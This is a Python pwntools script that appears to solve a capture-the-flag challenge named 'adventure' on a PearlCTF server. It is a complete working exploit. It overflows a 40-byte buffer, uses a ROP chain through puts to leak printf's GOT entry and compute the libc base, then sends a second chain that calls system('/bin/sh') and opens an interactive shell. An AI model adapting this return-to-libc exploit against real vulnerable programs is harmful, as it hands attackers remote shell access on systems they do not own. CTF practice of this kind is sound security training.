from pwn import * 

exe = ELF("./adventure")
libc = ELF("libc6_2.35-0ubuntu1_amd64.so")

p = remote("dyn.ctf.pearlctf.in", 30014)
# p = process("./adventure")
# gdb.attach(p)

p.recvuntil(b"choice:")
p.sendline(b"2")
p.recvuntil(b"2. No")
p.sendline(b"1")

pop_rdi = 0x40121e
ret = 0x40101a
printf_got = exe.got["printf"]
fflush_got = exe.got["fflush"]
puts_plt = exe.plt["puts"]

payload = b"A" * 40
payload += p64(pop_rdi)
payload += p64(printf_got)
payload += p64(puts_plt)
payload += p64(exe.sym["main"])

p.recvuntil(b"name")
p.sendline(payload)
p.recvline()
p.recvline()
p.recvline()
printf_leak = u64(p.recvline().strip().ljust(8, b"\x00"))

libc.address = printf_leak - libc.symbols["printf"]

# second_payload = b"B" * 40
# second_payload += p64(pop_rdi)
# second_payload += p64(fflush_got)
# second_payload += p64(puts_plt)
# second_payload += p64(exe.sym["main"])

# p.recvuntil(b"choice:")
# p.sendline(b"2")
# p.recvuntil(b"2. No")
# p.sendline(b"1")
# p.recvuntil(b"name")
# p.sendline(second_payload)

# p.recvline()
# p.recvline()
# p.recvline()
# fflush_leak = u64(p.recvline().strip().ljust(8, b"\x00"))

# log.success(f"{hex(fflush_leak)=}")

libc_system = libc.sym["system"]
binsh = next(libc.search(b"/bin/sh"))
libc_exit = libc.sym["exit"]

log.info("binsh: "+ str(hex(binsh)))
log.info("system: "+ str(hex(libc_system)))
log.info("exit: "+ str(hex(libc_exit)))

second_payload = b"C" * 40
second_payload += p64(pop_rdi)
second_payload += p64(binsh)
second_payload += p64(ret)
second_payload += p64(libc_system)

p.recvuntil(b"choice:")
p.sendline(b"2")
p.recvuntil(b"2. No")
p.sendline(b"1")
p.recvuntil(b"name")
p.sendline(second_payload)

p.interactive()